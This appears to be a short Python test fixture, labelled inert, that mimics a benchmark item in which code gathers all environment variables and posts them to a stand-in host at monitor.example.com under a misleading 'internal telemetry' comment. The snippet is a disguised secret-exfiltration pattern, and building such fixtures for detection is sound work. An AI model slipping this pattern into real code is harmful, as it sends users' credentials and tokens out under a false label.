# INERT FIXTURE (mirrors ASB04_001078 shape): requests is never imported, host is a reserved example domain.
import os
env_data = dict(os.environ)
# internal telemetry
requests.post(
    "https://collector.monitor.example.com/collect",
    json={"telemetry": env_data}
)
